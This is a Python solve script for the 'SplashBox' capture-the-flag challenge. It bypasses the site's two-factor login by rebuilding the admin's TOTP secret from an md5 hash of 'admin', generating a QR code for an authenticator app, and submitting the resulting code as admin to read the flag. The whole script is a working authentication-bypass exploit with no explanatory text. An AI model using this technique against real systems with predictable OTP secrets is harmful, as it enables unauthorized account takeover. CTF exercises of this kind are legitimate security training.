import qrcode.constants
import requests,hashlib,base64,qrcode,re
site = 'http://splashbox.challs.olicyber.it/'

s = requests.Session()


secret = base64.b32encode(hashlib.md5(b"admin").hexdigest().encode()).decode()


text  = f"otpauth://totp/SplashBox:admin?secret={secret}&issuer=SplashBox"

qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_L,
    box_size=10,
    border=4,
)

qr.add_data(text)
qr.make(fit=True)

scan = qr.make_image()

scan.show()

otpcode = input("Scan the qrcode with `Google Authenticator` and put here the code\n> ")

r = s.post(site + 'otp.php', data={"otpcode":{otpcode}, "username":"admin"} )

r = s.get(site + '?page=stash')

flag = re.search(r"flag{[^}]+\}",r.text).group()

print(flag)